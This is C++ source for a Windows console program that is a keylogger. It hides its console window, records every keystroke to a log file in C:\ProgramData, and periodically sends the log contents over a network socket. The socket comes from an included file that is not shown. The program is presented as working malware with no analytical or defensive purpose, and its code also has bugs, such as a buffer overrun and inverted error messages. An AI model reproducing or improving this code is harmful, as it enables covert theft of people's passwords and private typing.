// del.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <string>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#pragma comment (lib,"WS2_32.lib")
using namespace std;


#include"soketebi.cpp"


char *read(char *path);
int Save(int _key,char *file);
void keyloger()
{
	void *sock =CreateSoket(); ///// misamarti SOCK
	/////////////////////////////////////////////////////////
	
	unsigned int count=0;
	while(1)
	{
 			for(int i=1;i<=255;i++)
			{
				if(GetAsyncKeyState(i)==-32767)
				{
					count++;
					Save(i,"C:\\ProgramData\\log.txt");
				
				}
				
			}

			if(count>30)
			{
					printf("shemovidaa\n\n");
					char *bufffer=read("C:\\ProgramData\\log.txt");
					count=0;
									
						if(strlen(bufffer) > 5) ///    c_str utitebs  userInput ze misamartze rac weria anu send agzavnis orobitshi da cherez operatiulida akitxebs ororbitshi
						{
								int sendResult = send((unsigned __int64) sock,(const char*)bufffer,strlen(bufffer)+1,0);
								if(sendResult != SOCKET_ERROR)
								printf("ar gaigzavna");
						}

			}

			Sleep(30);

	}



	
	WSACleanup();
	
}


int _tmain(int argc, _TCHAR* argv[])
{
	FreeConsole();


	keyloger();
	return 0;
}





int Save(int _key,char *file)
{
	cout<< _key<<endl;
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen(file,"a+");

	if(OUTPUT_FILE){
			if(_key==VK_SHIFT)
				fprintf(OUTPUT_FILE,"%s","[SHIFT]");

			if(_key==VK_BACK)
				fprintf(OUTPUT_FILE,"%s","[BACK]");

				if(_key==VK_LBUTTON)
				fprintf(OUTPUT_FILE,"%s","");

						if(_key==VK_RETURN)
				fprintf(OUTPUT_FILE,"%s","");

					if(_key==VK_ESCAPE)
				fprintf(OUTPUT_FILE,"%s","[ESCAPE]");


			else
	
			fprintf(OUTPUT_FILE,"%s",&_key);
	}
	fclose(OUTPUT_FILE);



	return 0;
}

char *read(char *path)
{	
	char buf[100];
	FILE *file;
	file=fopen(path,"rb");

	
	fseek(file,0,SEEK_END);
	int size=ftell(file);
	fseek(file,0,SEEK_SET);

	 char *cv;	
	 cv=( char*)malloc(size);
	
	if(cv==NULL){

	}
	else
		{
		//	while(fgetc(c,size, 1, file));
		fread(cv,size,1,file);
		cv[size]=0;
		fclose(file);
	}
		return (char*)cv;
}